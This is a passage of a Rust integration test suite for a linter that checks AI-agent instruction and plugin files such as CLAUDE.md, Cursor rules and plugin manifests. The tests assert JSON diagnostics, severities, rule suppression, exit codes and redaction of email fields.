    std::fs::create_dir_all(plugin.parent().unwrap()).unwrap();
    std::fs::write(
        plugin,
        r#"{"name":"script-list","version":"1.0.0","description":"Fixture"}"#,
    )
    .unwrap();
    std::fs::create_dir(tmp.path().join("scripts")).unwrap();
    for path in [
        "shell.sh",
        "shell.bash",
        "library.inc.bash",
        "rules.awk",
        "tool.py",
        "tool.js",
        "tool.mjs",
        "extensionless",
        "readme.txt",
    ] {
        std::fs::write(tmp.path().join("scripts").join(path), "fixture\n").unwrap();
    }

    let output = run_in(tmp.path(), &["--list-scripts", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    assert_eq!(
        String::from_utf8_lossy(&output.stdout),
        "scripts/extensionless\nscripts/library.inc.bash\nscripts/rules.awk\nscripts/shell.bash\nscripts/shell.sh\nscripts/tool.js\nscripts/tool.mjs\nscripts/tool.py\n"
    );
}

#[test]
fn json_clean_run_is_schema_valid_and_deterministic() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude")).unwrap();

    let first = run_in(tmp.path(), &["--format", "json", "."]);
    let second = run_in(tmp.path(), &["--format", "json", "."]);
    assert!(first.status.success());
    assert!(second.status.success());
    let first = json(&first);
    let second = json(&second);
    assert_eq!(first, second);
    assert_eq!(first["schema_version"], 1);
    assert_eq!(first["analysis_root"], ".");
    assert_eq!(first["mode"], "basic");
    assert_eq!(first["strictness"], "normal");
    assert!(first["selected_rules"].is_null());
    assert_eq!(first["active_platforms"], serde_json::json!(["claude"]));
    assert_eq!(first["status"], "clean");
    assert_eq!(first["counts"]["errors"], 0);
    assert_eq!(first["counts"]["warnings"], 0);
    assert_eq!(first["diagnostics"], serde_json::json!([]));
}

#[test]
fn marketplace_only_repo_does_not_report_missing_plugin_manifest() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/marketplace.json"),
        "{ not valid JSON",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "M001", "."]);
    assert!(output.status.success());
    assert_eq!(json(&output)["diagnostics"], serde_json::json!([]));
}

#[test]
fn plugin_only_repo_preserves_missing_marketplace_severity_across_modes() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"plugin","version":"1.0.0"}"#,
    )
    .unwrap();

    for (arguments, exit_code, severity) in [
        (
            vec!["--format", "json", "--only", "M005", "."],
            0,
            "warning",
        ),
        (
            vec!["--format", "json", "--pedantic", "--only", "M005", "."],
            1,
            "error",
        ),
        (
            vec!["--format", "json", "--all", "--only", "M005", "."],
            1,
            "error",
        ),
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(output.status.code(), Some(exit_code));
        let diagnostics = &json(&output)["diagnostics"];
        assert_eq!(diagnostics.as_array().map(Vec::len), Some(1));
        assert_eq!(diagnostics[0]["code"], "M005");
        assert_eq!(diagnostics[0]["severity"], severity);
    }
}

#[test]
fn prompt_analysis_covers_all_supported_live_instruction_surfaces() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());

    let files = [
        ("CLAUDE.md", "Retry until success.\n"),
        ("nested/CLAUDE.md", "Retry until success.\n"),
        (
            ".agents/skills/shared/SKILL.md",
            "---\nname: shared\ndescription: Shared skill used for prompt coverage tests\n---\nRetry until success.\n",
        ),
        (".claude/agents/reviewer.md", "Retry until success.\n"),
        (
            ".cursor/rules/retry.mdc",
            "---\ndescription: [unclosed\n---\nRetry until success.\n",
        ),
        (".cursor/agents/reviewer.md", "Retry until success.\n"),
        (
            ".cursor/skills/reviewer/SKILL.md",
            "---\nname: reviewer\ndescription: Cursor skill used for prompt coverage tests\n---\nRetry until success.\n",
        ),
        ("AGENTS.override.md", "Retry until success.\n"),
        (
            "nested/excluded/CLAUDE.md",
            "```text\nRetry until success.\n```\n",
        ),
        (
            ".agents/skills/shared-quote/SKILL.md",
            "---\nname: shared-quote\ndescription: Shared quoted skill used for prompt coverage tests\n---\n> Retry until success.\n",
        ),
        (".claude/agents/quoted.md", "> Retry until success.\n"),
        (
            ".cursor/rules/quoted.mdc",
            "---\ndescription: quoted rule\n---\n> Retry until success.\n",
        ),
        (".cursor/agents/quoted.md", "> Retry until success.\n"),
        (
            ".cursor/skills/quoted/SKILL.md",
            "---\nname: quoted\ndescription: Cursor quoted skill used for prompt coverage tests\n---\n> Retry until success.\n",
        ),
    ];
    for (relative, content) in files {
        let path = tmp.path().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, content).unwrap();
    }

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert_eq!(output.status.code(), Some(1));
    let report = json(&output);
    let q005_paths: std::collections::BTreeSet<_> = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|diagnostic| diagnostic["code"] == "Q005")
        .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
        .collect();
    assert_eq!(
        q005_paths,
        [
            ".agents/skills/shared/SKILL.md",
            ".claude/agents/reviewer.md",
            ".cursor/agents/reviewer.md",
            ".cursor/rules/retry.mdc",
            ".cursor/skills/reviewer/SKILL.md",
            "AGENTS.override.md",
            "CLAUDE.md",
            "nested/CLAUDE.md",
        ]
        .into_iter()
        .collect()
    );
    assert!(
        report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .any(|diagnostic| {
                diagnostic["code"] == "CU003"
                    && diagnostic["subject_path"] == ".cursor/rules/retry.mdc"
            })
    );
    assert!(
        report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .any(|diagnostic| {
                diagnostic["code"] == "A002"
                    && diagnostic["subject_path"] == ".claude/agents/reviewer.md"
            })
    );
}

#[test]
fn cursor_frontmatter_recovery_keeps_q005_selection_and_suppression_independent() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let rules = tmp.path().join(".cursor/rules");
    std::fs::create_dir_all(&rules).unwrap();
    std::fs::write(
        rules.join("missing-frontmatter.mdc"),
        "Retry until success.\n",
    )
    .unwrap();
    std::fs::write(
        rules.join("invalid-frontmatter.mdc"),
        "---\ndescription: [unclosed\n---\nRetry until success.\n",
    )
    .unwrap();

    let q_only = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "Q005", "."],
    ));
    assert_eq!(
        q_only["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
            .collect::<std::collections::BTreeSet<_>>(),
        [
            ".cursor/rules/invalid-frontmatter.mdc",
            ".cursor/rules/missing-frontmatter.mdc",
        ]
        .into_iter()
        .collect()
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".cursor/rules/*.mdc\"]\nsuppress = [\"CU002\", \"CU003\"]\n",
    )
    .unwrap();
    let structural_suppressed = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "CU002,CU003,Q005", "."],
    ));
    assert_eq!(structural_suppressed["counts"]["suppressed"], 2);
    assert_eq!(
        structural_suppressed["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["code"].as_str().unwrap())
            .collect::<Vec<_>>(),
        ["Q005", "Q005"]
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\".cursor/rules/*.mdc\"]\nsuppress = [\"Q005\"]\n",
    )
    .unwrap();
    let prompt_suppressed = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "CU002,CU003,Q005", "."],
    ));
    assert_eq!(prompt_suppressed["counts"]["suppressed"], 2);
    assert_eq!(
        prompt_suppressed["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["code"].as_str().unwrap())
            .collect::<Vec<_>>(),
        ["CU002", "CU003"]
    );
}

#[test]
fn prompt_analysis_excludes_quoted_codex_override_prose() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("AGENTS.override.md"),
        "> Retry until success.\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert!(output.status.success());
    let report = json(&output);
    assert!(
        report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .all(|diagnostic| { diagnostic["code"] != "Q005" })
    );
}

#[test]
fn q006_json_pairs_are_complete_stable_and_exclude_non_output_shape_prose() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("AGENTS.md"),
        "Return only JSON.\nReturn only XML.\nReturn only YAML.\n\
         The input contains exactly one sentence.\nThe request contains at least three paragraphs.\n",
    )
    .unwrap();

    let first = run_in(tmp.path(), &["--format", "json", "--only", "Q006", "."]);
    let second = run_in(tmp.path(), &["--format", "json", "--only", "Q006", "."]);
    assert!(first.status.success());
    assert!(second.status.success());
    let first = json(&first);
    let second = json(&second);
    assert_eq!(first, second);

    let diagnostics = first["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 3);
    let evidence = diagnostics
        .iter()
        .map(|diagnostic| diagnostic["evidence"].as_str().unwrap())
        .collect::<Vec<_>>();
    assert!(
        evidence[0].starts_with("line 1 column 1:") && evidence[0].contains("line 2 column 1:")
    );
    assert!(
        evidence[1].starts_with("line 1 column 1:") && evidence[1].contains("line 3 column 1:")
    );
    assert!(
        evidence[2].starts_with("line 2 column 1:") && evidence[2].contains("line 3 column 1:")
    );
}

#[test]
fn q006_discovers_cursor_mdc_and_legacy_rules_through_the_cli() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".cursor/rules")).unwrap();
    let conflict = "Return only JSON.\nRespond in Markdown.\n";
    std::fs::write(
        tmp.path().join(".cursor/rules/project.mdc"),
        format!("---\ndescription: Enforces a response format\nalwaysApply: true\n---\n{conflict}"),
    )
    .unwrap();
    std::fs::write(tmp.path().join(".cursorrules"), conflict).unwrap();

    let report = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "Q006", "."],
    ));
    let subjects = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
        .collect::<Vec<_>>();
    assert_eq!(subjects, vec![".cursorrules", ".cursor/rules/project.mdc"]);
}

#[test]
fn nested_cursor_rules_have_extension_and_prompt_content_cli_contracts() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let mdc = tmp.path().join("packages/api/.cursor/rules/api.mdc");
    let first_md = tmp.path().join("packages/api/.cursor/rules/not-a-rule.md");
    let second_md = tmp
        .path()
        .join("packages/web/.cursor/rules/also-not-a-rule.md");
    for path in [&mdc, &first_md, &second_md] {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    }
    std::fs::write(&mdc, "---\nalwaysApply: true\n---\nRetry until success.\n").unwrap();
    std::fs::write(&first_md, "Retry until success.\n").unwrap();
    std::fs::write(&second_md, "Retry until success.\n").unwrap();

    let extension_report = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "CU020", "."],
    ));
    assert_eq!(
        extension_report["active_platforms"],
        serde_json::json!(["claude", "cursor"])
    );
    let extension_diagnostics = extension_report["diagnostics"].as_array().unwrap();
    assert_eq!(extension_diagnostics.len(), 2);
    assert_eq!(
        extension_diagnostics
            .iter()
            .map(|diagnostic| (
                diagnostic["code"].as_str().unwrap(),
                diagnostic["severity"].as_str().unwrap(),
                diagnostic["subject_path"].as_str().unwrap(),
            ))
            .collect::<Vec<_>>(),
        vec![
            (
                "CU020",
                "warning",
                "packages/api/.cursor/rules/not-a-rule.md",
            ),
            (
                "CU020",
                "warning",
                "packages/web/.cursor/rules/also-not-a-rule.md",
            ),
        ]
    );
    assert_eq!(
        extension_diagnostics[0]["suggestion"],
        "rename to packages/api/.cursor/rules/not-a-rule.mdc"
    );

    for (arguments, severity, exit_code) in [
        (
            vec!["--format", "json", "--pedantic", "--only", "CU020", "."],
            "error",
            Some(1),
        ),
        (
            vec!["--format", "json", "--all", "--only", "CU020", "."],
            "error",
            Some(1),
        ),
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(
            output.status.code(),
            exit_code,
            "stderr: {}",
            stderr(&output)
        );
        assert!(
            json(&output)["diagnostics"]
                .as_array()
                .unwrap()
                .iter()
                .all(|diagnostic| diagnostic["severity"] == severity),
            "{arguments:?} must classify CU020 as {severity}"
        );
    }

    let prompt_report = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "Q005", "."],
    ));
    assert_eq!(
        prompt_report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
            .collect::<Vec<_>>(),
        vec!["packages/api/.cursor/rules/api.mdc"]
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[platforms]\ncursor = false\n",
    )
    .unwrap();
    let disabled = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "CU020", "."],
    ));
    assert_eq!(disabled["active_platforms"], serde_json::json!([]));
    assert!(disabled["diagnostics"].as_array().unwrap().is_empty());

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[[lint.overrides]]\nfiles = [\"packages/api/.cursor/rules/not-a-rule.md\"]\nsuppress = [\"CU020\"]\n",
    )
    .unwrap();
    let suppressed = json(&run_in(
        tmp.path(),
        &["--format", "json", "--only", "CU020", "."],
    ));
    assert_eq!(suppressed["counts"]["suppressed"], 1);
    assert_eq!(
        suppressed["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
            .collect::<Vec<_>>(),
        vec!["packages/web/.cursor/rules/also-not-a-rule.md"]
    );
}

#[test]
fn q004_cli_preserves_source_metadata_modes_and_claude_scoped_policy() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("CLAUDE.md"),
        "Keep the changelog current.\nRun the focused test suite.\nReview diagnostics before merging.\nUse small commits.\nPreserve unrelated formatting.\nCheck the final diff.\nDocument intentional deviations.\n",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("README.md"),
        "Keep the changelog current.\nRun the focused test suite.\nReview diagnostics before merging.\n",
    )
    .unwrap();

    let normal = run_in(tmp.path(), &["--format", "json", "--only", "Q004", "."]);
    assert!(normal.status.success(), "stderr: {}", stderr(&normal));
    let report = json(&normal);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1, "{report:#}");
    let diagnostic = &diagnostics[0];
    assert_eq!(diagnostic["code"], "Q004");
    assert_eq!(diagnostic["severity"], "warning");
    assert_eq!(diagnostic["subject_path"], "CLAUDE.md");
    assert_eq!(
        diagnostic["related_subjects"],
        serde_json::json!(["README.md"])
    );
    assert_eq!(diagnostic["location"]["start"]["line"], 1);
    assert_eq!(
        diagnostic["evidence"],
        "matched 3 of 7 eligible CLAUDE.md lines; line pairs: 1:1, 2:2, 3:3"
    );
    assert_eq!(
        diagnostic["suggestion"],
        "Replace the duplicated block with a README link, or keep only agent-specific instructions in CLAUDE.md."
    );

    for strictness in ["--pedantic", "--all"] {
        let output = run_in(
            tmp.path(),
            &["--format", "json", strictness, "--only", "Q004", "."],
        );
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        assert_eq!(json(&output)["diagnostics"][0]["severity"], "error");
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nerror = [\"Q004\"]\n",
    )
    .unwrap();
    let explicit_error = run_in(tmp.path(), &["--format", "json", "--only", "Q004", "."]);
    assert_eq!(explicit_error.status.code(), Some(1));
    assert_eq!(json(&explicit_error)["diagnostics"][0]["severity"], "error");

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\"CLAUDE.md\"]\nsuppress = [\"Q004\"]\n",
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--format", "json", "--only", "Q004", "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert_eq!(json(&suppressed)["counts"]["suppressed"], 1);

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nexclude = [\"CLAUDE.md\"]\n",
    )
    .unwrap();
    let excluded = run_in(tmp.path(), &["--format", "json", "--only", "Q004", "."]);
    assert!(excluded.status.success(), "stderr: {}", stderr(&excluded));
    assert_eq!(json(&excluded)["diagnostics"], serde_json::json!([]));
}

#[test]
fn json_no_work_run_is_clean_with_no_selected_mode() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert!(output.status.success());
    let report = json(&output);
    assert_eq!(report["status"], "clean");
    assert!(report["mode"].is_null());
    assert_eq!(report["active_platforms"], serde_json::json!([]));
    assert_eq!(report["diagnostics"], serde_json::json!([]));
}

#[test]
fn json_lists_forced_platforms_in_stable_order() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[platforms]\ncursor = true\ncodex = true\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    let report = json(&output);
    assert_eq!(report["mode"], "basic");
    assert_eq!(
        report["active_platforms"],
        serde_json::json!(["claude", "cursor", "codex"])
    );
}

#[test]
fn json_reports_focused_rule_selection_and_only_emits_selected_rules() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();

    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "H001,M001", "."],
    );
    assert_eq!(output.status.code(), Some(1));
    let report = json(&output);
    assert_eq!(
        report["selected_rules"],
        serde_json::json!([
            { "code": "M001", "name": "plugin-json-missing" },
            { "code": "H001", "name": "hooks-json-missing" }
        ])
    );
    assert!(
        report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .all(|diagnostic| matches!(diagnostic["code"].as_str(), Some("M001" | "H001")))
    );
}

#[test]
fn json_mixed_run_has_structured_rule_fields_and_unchanged_exit_status() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();

    let text = run_in(tmp.path(), &["."]);
    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert_eq!(text.status.code(), Some(1));
    assert_eq!(output.status.code(), text.status.code());
    let report = json(&output);
    assert_eq!(report["status"], "errors");
    assert!(report["counts"]["errors"].as_u64().unwrap() > 0);
    assert!(report["counts"]["warnings"].as_u64().unwrap() > 0);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert!(diagnostics.iter().any(|diagnostic| {
        diagnostic["code"] == "M001"
            && diagnostic["name"] == "plugin-json-missing"
            && diagnostic["severity"] == "error"
            && diagnostic["subject_path"] == ".claude-plugin/plugin.json"
    }));
}

#[test]
fn json_preserves_structured_locations_without_fabricating_them() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/example/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        skill,
        "---\nname: example\ndescription: Use when checking an intentionally broken fenced block\n---\n```bash\necho broken\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    let located = diagnostics
        .iter()
        .find(|diagnostic| diagnostic["code"] == "X002")
        .expect("unclosed fence diagnostic is present");
    assert_eq!(located["subject_path"], ".claude/skills/example/SKILL.md");
    assert_eq!(located["location"]["start"]["line"], 5);
    assert!(located["location"]["start"].get("column").is_none());
}

#[test]
fn json_xml_structure_diagnostics_preserve_structured_locations() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/example/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        skill,
        "---\nname: example\ndescription: Use when checking XML structure locations\n---\n<a>\n</b>\n</c>\n<div>\n",
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
        &["--format", "json", "--only", "X003,X004,X005", "."],
    );
    let diagnostics = json(&output)["diagnostics"].as_array().unwrap().clone();
    for (code, line) in [("X003", 8), ("X004", 6), ("X005", 7)] {
        let diagnostic = diagnostics
            .iter()
            .find(|diagnostic| diagnostic["code"] == code)
            .unwrap_or_else(|| panic!("{code} diagnostic is present"));
        assert_eq!(
            diagnostic["subject_path"],
            ".claude/skills/example/SKILL.md"
        );
        assert_eq!(diagnostic["location"]["start"]["line"], line);
        assert!(diagnostic["location"]["start"].get("column").is_none());
    }
}

#[test]
fn s059_json_reports_the_fence_line_and_actionable_suggestion() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/example/SKILL.md");
    let script = tmp.path().join(".claude/skills/example/scripts/run.sh");
    std::fs::create_dir_all(script.parent().unwrap()).unwrap();
    std::fs::write(&script, "#!/bin/sh\ncase \"$1\" in --known) ;; esac\n").unwrap();
    std::fs::write(
        skill,
        "---\nname: example\ndescription: Use when checking shipped-script flag signatures\n---\n```bash\nscripts/run.sh --missing\n```\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "S059", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let diagnostics = json(&output)["diagnostics"].as_array().unwrap().clone();
    assert_eq!(diagnostics.len(), 1);
    let diagnostic = &diagnostics[0];
    assert_eq!(diagnostic["code"], "S059");
    assert_eq!(
        diagnostic["subject_path"],
        ".claude/skills/example/SKILL.md"
    );
    assert_eq!(diagnostic["location"]["start"]["line"], 6);
    assert!(diagnostic["location"]["start"].get("column").is_none());
    assert_eq!(
        diagnostic["suggestion"],
        "remove the unsupported flag or add it to the shipped script's parser"
    );
}

#[test]
fn invalid_json_manifest_diagnostics_are_relative_and_located() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    for relative in [
        ".claude-plugin/plugin.json",
        ".claude-plugin/marketplace.json",
        "hooks/hooks.json",
        ".claude/settings.json",
        ".claude/settings.local.json",
    ] {
        let path = tmp.path().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, "{\n  invalid\n}").unwrap();
    }

    let output = run_in(
        tmp.path(),
        &[
            "--format",
            "json",
            "--only",
            "M002,M006,H002,H006,H025",
            ".",
        ],
    );
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 5, "{report:#}");
    for diagnostic in diagnostics {
        let subject = diagnostic["subject_path"].as_str().unwrap();
        assert!(diagnostic["message"].as_str().unwrap().starts_with(subject));
        assert!(
            !diagnostic["message"]
                .as_str()
                .unwrap()
                .contains(tmp.path().to_str().unwrap())
        );
        assert_eq!(diagnostic["location"]["start"]["line"], 2);
        assert_eq!(diagnostic["location"]["start"]["column"], 3);
    }
}

#[test]
fn email_metadata_contract_preserves_privacy_policy_and_locations() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let manifest_dir = tmp.path().join(".claude-plugin");
    std::fs::create_dir(&manifest_dir).unwrap();
    let private_email = "private-routing@example";
    std::fs::write(
        manifest_dir.join("plugin.json"),
        format!(
            "{{\n  \"name\": \"plugin\",\n  \"author\": {{\"email\": \"{private_email}\"}}\n}}\n"
        ),
    )
    .unwrap();
    std::fs::write(
        manifest_dir.join("marketplace.json"),
        "{\n  \"name\": \"marketplace\",\n  \"owner\": {\"email\": 42},\n  \"plugins\": []\n}\n",
    )
    .unwrap();

    for (strictness, format_severity) in [
        (vec![], "warning"),
        (vec!["--pedantic"], "error"),
        (vec!["--all"], "error"),
    ] {
        let mut args = vec!["--format", "json"];
        args.extend(strictness);
        args.extend(["--only", "E001,E002", "."]);
        let output = run_in(tmp.path(), &args);
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        let report = json(&output);
        let diagnostics = report["diagnostics"].as_array().unwrap();
        assert_eq!(diagnostics.len(), 2, "{report:#}");
        assert_eq!(diagnostics[0]["code"], "E001");
        assert_eq!(diagnostics[0]["severity"], format_severity);
        assert_eq!(diagnostics[0]["subject_path"], ".claude-plugin/plugin.json");
        assert_eq!(diagnostics[0]["location"]["start"]["line"], 3);
        assert_eq!(diagnostics[1]["code"], "E002");
        assert_eq!(diagnostics[1]["severity"], "error");
        assert_eq!(
            diagnostics[1]["subject_path"],
            ".claude-plugin/marketplace.json"
        );
        assert_eq!(diagnostics[1]["location"]["start"]["line"], 3);
        for diagnostic in diagnostics {
            assert_eq!(diagnostic["evidence"], "[redacted: possible secret]");
            assert!(diagnostic["suggestion"].is_string());
        }
        assert!(!String::from_utf8_lossy(&output.stdout).contains(private_email));
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
exclude = [".claude-plugin/plugin.json", ".claude-plugin/marketplace.json"]
[[lint.overrides]]
files = [".claude-plugin/plugin.json"]
suppress = ["E001"]
"#,
    )
    .unwrap();
    let overridden = run_in(
        tmp.path(),
        &["--format", "json", "--only", "E001,E002", "."],
    );
    let overridden_report = json(&overridden);
    assert_eq!(overridden_report["counts"]["suppressed"], 1);
    assert_eq!(
        overridden_report["diagnostics"].as_array().unwrap().len(),
        1
    );
    assert_eq!(overridden_report["diagnostics"][0]["code"], "E002");

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
suppress = ["E002"]
"#,
    )
    .unwrap();
    let globally_suppressed = run_in(
        tmp.path(),
        &["--format", "json", "--only", "E001,E002", "."],
    );
    assert!(globally_suppressed.status.success());
    let report = json(&globally_suppressed);
    assert_eq!(report["counts"]["suppressed"], 1);
    assert_eq!(report["diagnostics"].as_array().unwrap().len(), 1);
    assert_eq!(report["diagnostics"][0]["code"], "E001");
}

#[test]
fn email_rules_are_plugin_only_and_do_not_claim_malformed_json() {
    let basic = tempfile::tempdir().unwrap();
    init_git(basic.path());
    let basic_output = run_in(
        basic.path(),
        &["--format", "json", "--only", "E001,E002", "."],
    );
    assert!(
        basic_output.status.success(),
        "stderr: {}",
        stderr(&basic_output)
    );
    assert!(
        json(&basic_output)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );

    let malformed = tempfile::tempdir().unwrap();
    init_git(malformed.path());
    let path = malformed.path().join(".claude-plugin/plugin.json");
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, "{ invalid").unwrap();
    let malformed_output = run_in(
        malformed.path(),
        &["--format", "json", "--only", "E001,E002", "."],
    );
    assert!(
        malformed_output.status.success(),
        "stderr: {}",
        stderr(&malformed_output)
    );
    assert!(
        json(&malformed_output)["diagnostics"]
            .as_array()
            .unwrap()
            .is_empty()
    );
}

#[test]
fn manifest_author_and_channel_diagnostics_preserve_strictness_policy() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let plugin = tmp.path().join(".claude-plugin/plugin.json");
    std::fs::create_dir_all(plugin.parent().unwrap()).unwrap();
    std::fs::write(
        plugin,
        r#"{"name":"plugin","version":"1.0.0","author":"Ada","mcpServers":{"existing":{"command":"server"}},"channels":{"alerts":{"server":"missing"}}}"#,
    )
    .unwrap();

    for (arguments, channel_severity) in [
        (
            vec!["--format", "json", "--only", "M017,M020", "."],
            "warning",
        ),
        (
            vec!["--format", "json", "--pedantic", "--only", "M017,M020", "."],
            "error",
        ),
        (
            vec!["--format", "json", "--all", "--only", "M017,M020", "."],
            "error",
        ),
    ] {
        let output = run_in(tmp.path(), &arguments);
        assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
        let diagnostics = json(&output)["diagnostics"].as_array().unwrap().clone();
        assert_eq!(diagnostics.len(), 2);
        let channel = diagnostics
            .iter()
            .find(|diagnostic| diagnostic["code"] == "M017")
            .unwrap();
        assert_eq!(channel["severity"], channel_severity);
        let author = diagnostics
            .iter()
            .find(|diagnostic| diagnostic["code"] == "M020")
            .unwrap();
        assert_eq!(author["severity"], "error");
    }
}

#[test]
fn json_pathless_finding_has_no_subject_or_location() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(tmp.path().join("AGENTS.md"), "first line\nsecond line\n").unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.prompt-source-budgets]]
name = "agents"
roots = ["AGENTS.md"]
root-max-lines = 1
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    let report = json(&output);
    let diagnostic = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .find(|diagnostic| diagnostic["code"] == "S062")
        .expect("prompt budget diagnostic is present");
    assert!(diagnostic.get("subject_path").is_none());
    assert!(diagnostic.get("location").is_none());
}

#[test]
fn json_configuration_failure_is_one_document_and_exit_two() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(tmp.path().join("agent-lint.toml"), "not valid toml {{{\n").unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert_eq!(output.status.code(), Some(2));
    let report = json(&output);
    assert_eq!(report["status"], "usage-error");
    assert_eq!(report["counts"]["errors"], 0);
    assert_eq!(report["notices"][0]["kind"], "configuration");
